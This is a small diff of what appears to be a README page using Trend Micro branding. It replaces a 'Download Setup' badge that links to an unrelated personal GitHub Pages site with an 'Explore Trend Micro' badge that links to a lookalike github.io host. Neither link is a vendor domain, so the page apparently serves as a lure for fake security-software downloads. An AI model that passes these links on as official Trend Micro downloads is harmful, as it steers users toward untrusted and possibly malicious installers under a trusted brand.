@@ -4,7 +4,7 @@
 <img src="https://i.pcmag.com/imagery/reviews/06d3I25IvG8sG3Fdi0El2fq-30.fit_scale.size_400x225.v1740064305.png" alt="Trend Micro Logo" width="256" height="256">  
 </div>  
 
-[![Download Setup](https://img.shields.io/badge/Download-Setup-blue?style=for-the-badge&logo=windows)](https://tymaddenfjzo.github.io/.github/Trend-Micro)
+[![Explore Trend Micro](https://img.shields.io/badge/Explore-Trend%20Micro-DC2626?style=flat-square)](https://security-trend-micro.github.io/.github/)
 
 ---
 
